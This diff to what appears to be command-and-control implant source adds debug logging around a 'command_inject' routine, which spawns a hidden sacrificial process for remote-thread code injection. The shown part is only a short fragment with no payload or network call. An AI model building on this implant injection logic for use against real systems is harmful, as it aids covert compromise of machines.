@@ -5,6 +5,7 @@
 #include "syscalls.h"
 #include <stdio.h>
 #include <windows.h>
+#include "spawn_trace.h"
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -74,10 +75,13 @@ void command_inject(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
 		startupinfo_hidden(&si, NULL);
 
 	/* spawn our process */
+	spawn_log("inject: calling spawn_patsy x86=", (long)x86);
 	if (!spawn_patsy(x86, ignoreToken, &si, &pi)) {
+		spawn_log("inject: spawn_patsy FAILED", 0x7fffffff);
 		token_guard_stop_maybe(ignoreToken);
 		return;
 	}
+	spawn_log("inject: spawn_patsy ok pid=", (long)pi.dwProcessId);
 
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
 	Sleep(100);
